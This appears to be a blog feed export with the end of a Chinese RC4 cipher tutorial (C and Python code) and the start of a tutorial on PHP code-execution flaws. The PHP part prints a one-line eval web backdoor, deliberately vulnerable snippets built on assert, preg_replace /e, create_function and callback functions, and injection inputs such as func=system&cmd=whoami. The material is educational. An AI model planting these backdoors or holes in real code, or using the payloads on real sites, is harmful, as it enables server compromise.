<p>&emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。  </p>
<h2 id="3、RC4加密原理"><a href="#3、RC4加密原理" class="headerlink" title="3、RC4加密原理"></a>3、RC4加密原理</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015993488-6e14d89f-c789-4c1b-b5b2-5c431304f2d9.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638018567039-e5fed088-41f6-4467-8f34-52543c690500.png" alt="img"></p>
<p>&emsp;&emsp;RC4算法的原理很简单，包括<strong>初始化算法（KSA）</strong>和**伪随机子密码生成算法（PRGA)**两大部分。</p>
<h3 id="（1）初始化算法（KSA）"><a href="#（1）初始化算法（KSA）" class="headerlink" title="（1）初始化算法（KSA）"></a>（1）初始化算法（KSA）</h3><h4 id="①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）"><a href="#①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）" class="headerlink" title="① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）"></a>① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）</h4><p>&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255</p>
<h4 id="②-初始密钥（由用户输入），长度任意"><a href="#②-初始密钥（由用户输入），长度任意" class="headerlink" title="② 初始密钥（由用户输入），长度任意"></a>② 初始密钥（由用户输入），长度任意</h4><p>&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满</p>
<ul>
<li>例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……</li>
</ul>
<p>&emsp;&emsp;<strong>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</strong></p>
<h4 id="③-开始对状态向量S进行置换操作（用来打乱初始种子1）"><a href="#③-开始对状态向量S进行置换操作（用来打乱初始种子1）" class="headerlink" title="③ 开始对状态向量S进行置换操作（用来打乱初始种子1）"></a>③ 开始对状态向量S进行置换操作（用来打乱初始种子1）</h4><p>&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。</p>
<h3 id="（3）密钥流的生成与加密"><a href="#（3）密钥流的生成与加密" class="headerlink" title="（3）密钥流的生成与加密"></a>（3）密钥流的生成与加密</h3><p>&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123; <span class="comment">// 相当于执行1024次，这样生成的密钥流也是1024个字节</span></span><br><span class="line">    i = (i+<span class="number">1</span>)mod256;</span><br><span class="line">    j = (j+S[i])mod256;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">    t = (S[i]+S[j])mod256;</span><br><span class="line">    k = S[t]; 这里的k就是当前生成的一个密钥流中的一位</span><br><span class="line">    <span class="comment">// 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span></span><br><span class="line">    data[] = data[]^k;  <span class="comment">// 进行加密，^是异或运算符</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p>
<h1 id="三、完整算法实现"><a href="#三、完整算法实现" class="headerlink" title="三、完整算法实现"></a>三、完整算法实现</h1><h2 id="1、C"><a href="#1、C" class="headerlink" title="1、C"></a>1、C</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//程序完</span></span><br></pre></td></tr></table></figure>

<h2 id="2、Python"><a href="#2、Python" class="headerlink" title="2、Python"></a>2、Python</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rc4.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        T.append(key[i % length])</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_encrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4加密后(Base64编码)的字c符串是:&quot;</span> + <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span>(<span class="params">s_box, data</span>):</span></span><br><span class="line">    data = base64.b64decode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = <span class="built_in">bytes</span>.decode(data)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> rc4 <span class="keyword">import</span> rc4_init_sbox, rc4_encrypt, rc4_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        function = <span class="built_in">input</span>(<span class="string">&quot;E to encrypt or D to decrypt for rc4:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> function.upper() == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4加密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4加密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_encrypt(s_box, data)</span><br><span class="line">        <span class="keyword">elif</span> function.upper() == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">&quot;请输入你要进行RC4解密的数据：&quot;</span>)</span><br><span class="line">            key = <span class="built_in">input</span>(<span class="string">&quot;请输入RC4解密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_decrypt(s_box, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入正确的功能&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>参考链接：</p>
<ul>
<li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">https://www.cnblogs.com/gambler/p/9075415.html</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/block2016/p/5601925.html">https://www.cnblogs.com/block2016/p/5601925.html</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/d9ad5fc524ec">https://www.jianshu.com/p/d9ad5fc524ec</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE代码及命令执行漏洞</title>
    <url>/post/aa4ddb75.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644591328647-63745f79-5eae-41b2-ac53-9159cdb9a863.png" alt="img"></p>
<h1 id="一、代码执行"><a href="#一、代码执行" class="headerlink" title="一、代码执行"></a>一、代码执行</h1><h2 id="1、脚本"><a href="#1、脚本" class="headerlink" title="1、脚本"></a>1、脚本</h2><h3 id="（1）PHP"><a href="#（1）PHP" class="headerlink" title="（1）PHP"></a>（1）PHP</h3><p>&emsp;&emsp;PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。</p>
<p>&emsp;&emsp;常见代码执行函数，如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()、assert()、preg_replace()、create_function()</span><br><span class="line"></span><br><span class="line">array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()</span><br><span class="line"></span><br><span class="line">文件操作函数、动态函数（<span class="variable">$a</span>(<span class="variable">$b</span>)）</span><br></pre></td></tr></table></figure>

<h4 id="a、eval"><a href="#a、eval" class="headerlink" title="a、eval()"></a>a、eval()</h4><p>&emsp;&emsp;<code>eval()</code>函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="b、assert"><a href="#b、assert" class="headerlink" title="b、assert()"></a>b、assert()</h4><p>&emsp;&emsp;与eval类似，字符串被 <code>assert()</code> 当做 PHP 代码来执行，如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">assert(<span class="variable">$_REQUEST</span>[cmd]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="c、preg-replace"><a href="#c、preg-replace" class="headerlink" title="c、preg_replace"></a>c、preg_replace</h4><p>&emsp;&emsp;<strong>语法：</strong><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>&emsp;&emsp;搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
<p>&emsp;&emsp;<strong>参数说明：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">[+] $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">[+] $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">[+] $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">[+] $count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<strong>返回值：</strong>如果 subject 是一个数组， <code>preg_replace()</code> 返回一个数组， 其他情况下返回一个字符串。 如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 NULL。</p>
<p>&emsp;&emsp;<strong>危险点：</strong><code>preg_replace()</code>函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 <code>preg_replace()</code> 将 replacement 参数当作 PHP 代码</p>
<p><strong>&emsp;&emsp;示例代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/abc/e&quot;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="d、create-function"><a href="#d、create-function" class="headerlink" title="d、create_function()"></a>d、create_function()</h4><p>&emsp;&emsp;语法：<code>string create_function(string $args, string $code)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string $args 变量部分</span><br><span class="line">string $code 方法代码部分</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;类似于：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;举一个官方提供的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给<code>create_function()</code>执行任意命令。</p>
<p>&emsp;&emsp;现在利用<code>create_function()</code>实现代码注入</p>
<p>&emsp;&emsp;测试环境版本：apache +php 5.2、apache +php 5.3</p>
<p>&emsp;&emsp;有问题的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//index.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo  &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;利用方法：<code>index.php?id=2;&#125;phpinfo();/*</code></p>
<p>&emsp;&emsp;实现原理：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">由于id= <span class="number">2</span>;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">执行函数为：</span></span><br><span class="line"><span class="comment">源代码：</span></span><br><span class="line"><span class="comment">function fT($a) &#123;</span></span><br><span class="line"><span class="comment">  echo &quot;test&quot;.$a;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注入后代码：</span></span><br><span class="line"><span class="comment">function fT($a) &#123;</span></span><br><span class="line"><span class="comment">  echo &quot;test&quot;;&#125;</span></span><br><span class="line"><span class="comment">  phpinfo();/*;//此处为注入代码。</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644592882261-3685221a-8f4b-467d-9721-6a7a21a28cde.png" alt="img"></p>
<h4 id="e、array-map"><a href="#e、array-map" class="headerlink" title="e、array_map"></a>e、array_map</h4><p>&emsp;&emsp;<code>array_map()</code>函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给<code>array_map()</code>函数的数组数目一致。</p>
<p>&emsp;&emsp;代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//print_r($new_array);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="f、call-user-func-call-user-func-array"><a href="#f、call-user-func-call-user-func-array" class="headerlink" title="f、call_user_func()/call_user_func_array ()"></a>f、call_user_func()/call_user_func_array ()</h4><p>&emsp;&emsp;<code>call_user_func</code>——把第一个参数作为回调函数调用，其余参数是回调函数的参数。</p>
<p>&emsp;&emsp;<code>call_user_func_array</code>——调用回调函数，并把一个数组参数作为回调函数的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">@call_user_func(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line">call_user_func_array(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="g、array-filter"><a href="#g、array-filter" class="headerlink" title="g、array_filter()"></a>g、array_filter()</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array array_filter(array $array [, callable $callback [, int $flag = 0 ]] )</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">array_filter(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

